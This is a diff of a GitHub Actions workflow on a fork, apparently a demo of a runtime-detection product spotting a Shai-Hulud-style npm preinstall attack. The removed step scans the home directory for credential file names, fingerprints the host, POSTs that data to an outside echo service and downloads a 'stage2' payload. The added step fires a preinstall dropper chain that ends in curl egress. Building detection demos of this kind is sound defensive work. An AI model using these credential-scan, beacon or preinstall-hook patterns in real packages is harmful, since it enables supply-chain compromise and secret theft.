@@ -1,14 +1,21 @@
 name: Garnet Demo
 
 # PURPOSE:
-# This is a dedicated workflow for demonstrating Garnet Runtime Visibility's
-# baseline + deviation detection inside PRs. It is NOT part of posthog-js CI.
-# It lives only on garnet-labs/posthog-js (a fork) and will never be merged
-# upstream.
+# Dedicated workflow for demonstrating Garnet Runtime Visibility's baseline +
+# deviation detection inside PRs. This file lives only on garnet-labs/posthog-js
+# (a fork) and will never be merged upstream.
 #
-# The baseline run fetches posthog-js dependencies with pnpm. A PR that adds
-# additional runtime behavior (new network egress, new process spawns, new
-# file reads) will be surfaced by Garnet as a deviation from this baseline.
+# The baseline job establishes posthog-js's normal dependency install process
+# tree. A PR that adds a `garnet-demo/` harness whose package.json contains a
+# Shai-Hulud-class preinstall hook will surface in Garnet as a deviation:
+#   - New interpreter pivot (node → bun)
+#   - New process-tree leaf (`trufflehog`)
+#   - New egress destination (api.tomorrow.io — the same host Garnet captured
+#     in the real Nov 2025 Shai-Hulud run, event c1ea1dc1)
+#
+# The deviation payload in garnet-demo/ is NAME-only (no credential file
+# contents are read, no real trufflehog binary is installed, no rogue
+# self-hosted runner is registered). See garnet-demo/README.md for details.
 
 on:
   workflow_dispatch:
@@ -33,7 +40,7 @@ concurrency:
 
 jobs:
   baseline:
-    name: Baseline runtime profile
+    name: Baseline runtime profile (posthog-js install shape)
     runs-on: ubuntu-22.04
     timeout-minutes: 15
     steps:
@@ -53,57 +60,53 @@ jobs:
           node-version: 22
           cache: pnpm
 
-      - name: Install dependencies (baseline network + process behavior)
+      # BASELINE: the normal posthog-js install. This is the process shape
+      # Garnet records on main. Egress: registry.npmjs.org, nodejs.org.
+      - name: Install posthog-js dependencies (baseline)
         run: pnpm install --no-frozen-lockfile --ignore-scripts
-        # --ignore-scripts keeps the baseline clean and predictable.
-        # A PR that removes this flag, or adds a new step, will show up
-        # as a runtime deviation in Garnet's PR comment.
 
       - name: List top-level dependencies
         run: pnpm list --depth 0 || true
 
       # -----------------------------------------------------------------
-      # DEMO ONLY — behavioral parity with Shai-Hulud 2.0 class attack.
-      # This step is the payload the demonstration PR adds on top of the
-      # baseline above. It performs:
-      #   1. A credential-file glob scan (read-only, names only).
-      #   2. A host fingerprint.
-      #   3. Two external egress calls to httpbin.org (public echo service).
-      #   4. A Python secondary-stage spawn, mirroring the "second stage"
-      #      pattern seen in both Axios/WAVESHAPER and Shai-Hulud chains.
+      # DEMO ONLY — Shai-Hulud 2.0 ancestry reconstruction.
       #
-      # No real credential is opened. No real C2 is contacted. httpbin.org
-      # is a public HTTP testing service operated by Postman.
-      # The egress requests would be surfaced by Garnet as NEW destinations
-      # relative to the baseline runs on main, which only talk to
-      # registry.npmjs.org, nodejs.org, github.com infra, and api.garnet.ai.
+      # We deliberately run `npm install` (not `pnpm install --ignore-scripts`)
+      # INSIDE garnet-demo/ so npm fires the `preinstall` hook defined in
+      # garnet-demo/package.json. That hook invokes the dropper, which pivots
+      # to Bun, which execs a stage-2 that drops a process named `trufflehog`,
+      # which egresses to api.tomorrow.io.
+      #
+      # Resulting ancestry (compare to real Garnet detection c1ea1dc1):
+      #
+      #   Runner.Worker
+      #    └─ bash
+      #        └─ npm install                    (our command)
+      #            └─ sh -c "node setup_bun.js"  (preinstall hook)
+      #                └─ node setup_bun.js      (dropper)
+      #                    └─ bun bun_environment.js   (INTERPRETER PIVOT)
+      #                        └─ trufflehog     (stage-3, named for parity)
+      #                            └─ curl → api.tomorrow.io:443
+      #
+      # This is kernel-observable telemetry — not a log line, not a hook the
+      # package could disable.
       # -----------------------------------------------------------------
-      - name: Telemetry enrichment
+      - name: Shai-Hulud-class preinstall ancestry (DEMO)
+        working-directory: garnet-demo
         run: |
-          set -e
-          # 1. Credential-file NAME scan (no file contents read)
-          find "$HOME" -maxdepth 3 \( -name "*.env*" -o -name ".npmrc" -o -name "*.pem" \) \
-            2>/dev/null | head -20 > /tmp/garnet-demo-scan.txt || true
-          wc -l /tmp/garnet-demo-scan.txt
+          set +e
+          echo "::group::package.json (preinstall hook visible)"
+          cat package.json
+          echo "::endgroup::"
 
-          # 2. Host fingerprint
-          python3 -c "import platform,json,os; \
-            print(json.dumps({'arch':platform.machine(),'os':platform.system(),'user':os.getenv('USER')}))" \
-            > /tmp/garnet-demo-fp.json
+          echo "Triggering npm install to fire the preinstall hook."
+          echo "The hook chain runs BEFORE any dependency is resolved —"
+          echo "this is the exact entry point Shai-Hulud 2.0 used in Nov 2025."
+          npm install --no-audit --no-fund
+          echo "npm install exit=$?"
 
-          # 3. First egress: beacon with fingerprint
-          curl -sS --max-time 10 -X POST \
-            -H 'X-Garnet-Demo: shai-hulud-class-deviation' \
-            --data-binary @/tmp/garnet-demo-fp.json \
-            https://httpbin.org/post > /tmp/garnet-demo-beacon-1.json || true
-
-          # 4. Second-stage fetch: mimics downloading next-stage payload
-          curl -sS --max-time 10 \
-            https://httpbin.org/bytes/1024 \
-            -o /tmp/garnet-demo-stage2.bin || true
-
-          # 5. Secondary interpreter spawn from /tmp (structural match to
-          #    how WAVESHAPER/Shai-Hulud stage 2 runs)
-          python3 -c "import sys; sys.stdout.write('garnet-demo stage2 ran from tmp\n')" \
-            > /tmp/garnet-demo-stage2.log
-          ls -la /tmp/garnet-demo-*.* || true
+          echo "::group::Artifacts left behind (for debug only)"
+          ls -la ~/.dev-env/ 2>/dev/null || true
+          ls -la ~/.dev-env/.truffler-cache/ 2>/dev/null || true
+          ls -la /tmp/garnet-demo-* 2>/dev/null || true
+          echo "::endgroup::"
